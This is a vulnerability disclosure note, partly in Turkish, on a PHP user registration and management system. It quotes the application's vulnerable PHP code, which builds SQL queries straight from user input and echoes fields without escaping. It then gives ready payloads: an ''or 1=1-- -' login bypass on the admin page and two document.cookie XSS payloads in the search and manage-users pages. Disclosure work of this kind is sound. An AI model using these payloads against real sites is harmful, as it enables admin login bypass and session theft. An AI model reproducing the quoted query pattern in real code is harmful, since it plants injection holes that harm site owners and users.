## Target;
    ** User Registration & Login and User Management System

## URL:
    - https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/

## VULN PARAMETRE;

# ADMIN LOGIN SQL INJECTION    
    - http://localhost/loginsystem/admin/
        {username}
            if(isset($_POST['login']))
            {
            $adminusername=$_POST['username'];
            $pass=md5($_POST['password']);
            $ret=mysqli_query($con,"SELECT * FROM admin WHERE username='$adminusername' and password='$pass'");
            $num=mysqli_fetch_array($ret);
            if($num>0)
            {
            $extra="dashboard.php";
            $_SESSION['login']=$_POST['username'];
            $_SESSION['adminid']=$num['id'];
            echo "<script>window.location.href='".$extra."'</script>";
            exit();
            }
            else
            {
            echo "<script>alert('Invalid username or password');</script>";
            $extra="index.php";
            echo "<script>window.location.href='".$extra."'</script>";
            exit();
            }
            }
            ?>
    
    ! Sistem uzerinde admin icin login olurken bu kod calistirilir.Ancak kodda kullanici username kismina ne yazar ise direk database uzerinde yazmasi soylenmis boyle bir durumde direk sql injection hatasi ortaya cikiyor.
    !! PAYLOAD= 'or 1=1-- - {Password kisminda istedigimiz seyi yazabiliriz.}

# ADMIN SEARCH XSS 
    - http://localhost/loginsystem/admin/search-result.php
        - {searchkey=}
            <?php 
            $searchkey=$_POST['searchkey'];
            $ret=mysqli_query($con,"select * from users where (fname like '%$searchkey%' || email like '%$searchkey%' || contactno like '%$searchkey%')");
                                        $cnt=1;
                                        while($row=mysqli_fetch_array($ret))
                                        {?>
                                        <tr>
                                        <td><?php echo $cnt;?></td>
                                            <td><?php echo $row['fname'];?></td>
                                            <td><?php echo $row['lname'];?></td>
                                            <td><?php echo $row['email'];?></td>
                                            <td><?php echo $row['contactno'];?></td>  <td><?php echo $row['posting_date'];?></td>
                                            <td>
                                                
                                                <a href="user-profile.php?uid=<?php echo $row['id'];?>"> 
                                    <i class="fas fa-edit"></i></a>
                                                <a href="manage-users.php?id=<?php echo $row['id'];?>" onClick="return confirm('Do you really want to delete');"><i class="fa fa-trash" aria-hidden="true"></i></a>
                                            </td>
                                        </tr>
                                        <?php $cnt=$cnt+1; }?>
                                                
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </main>
            <?php include('../includes/footer.php');?>
                        </div>
                    </div>
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
                    <script src="../js/scripts.js"></script>
                    <script src="https://cdn.jsdelivr.net/npm/simple-datatables@latest" crossorigin="anonymous"></script>
                    <script src="../js/datatables-simple-demo.js"></script>
                </body>
            </html>
            <?php } ?>

    ! Sisteme admin olarak girildigi zaman search sistemi uzerinde xss kodu calistirilabiliyor. `$ret=mysqli_query($con,"select * from users where (fname like '%$searchkey%' || email like '%$searchkey%' || contactno like '%$searchkey%')");` bu girdi direk kullanicinin yazdigi veriyi direk database yazar bu durumda sqli ve xss ortaya cikiyor.
    !! Payload = <svg/onload=alert(document.cookie)>

# ADMIN MANAGE USER
    - http://localhost/loginsystem/admin/manage-users.php
       - {fname=}
            <td><input class="form-control" id="fname" name="fname" type="text" value="<?php echo $result['fname'];?>" required /></td>
        
    ! Sistemde admin yetkisi bulunan kullanici her hangi bir kacma durumu yasamadan direk basit bir xss kodu ile sistem uzerinde xss kodu calistirabiliyor.
    !! Payload = <script>alert(document.cookie)</script>































